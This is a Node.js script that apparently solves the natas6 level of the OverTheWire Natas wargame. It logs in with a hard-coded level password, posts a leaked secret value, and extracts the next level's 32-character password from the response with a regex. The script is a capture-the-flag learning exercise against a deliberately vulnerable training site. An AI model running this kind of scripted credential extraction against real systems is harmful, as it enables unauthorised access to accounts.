const http = require('http');
const fs = require('fs');
const querystring = require('querystring');

let username = 'natas6';
let password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1';

let post_data = querystring.stringify({
    'secret' : 'FOEIUWGHFEEUHOFUOIU',
    'submit' : true
})

let options = {
    host: `${username}.natas.labs.overthewire.org`,
    auth: `${username}:${password}`,
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(post_data)
    }
}

let request = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', data => {
        //fs.writeFile('index.html', data, () => {});
        console.log(data.match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
    });
});

request.on('error', error => {
    console.log(error)
});

request.write(post_data);
request.end();
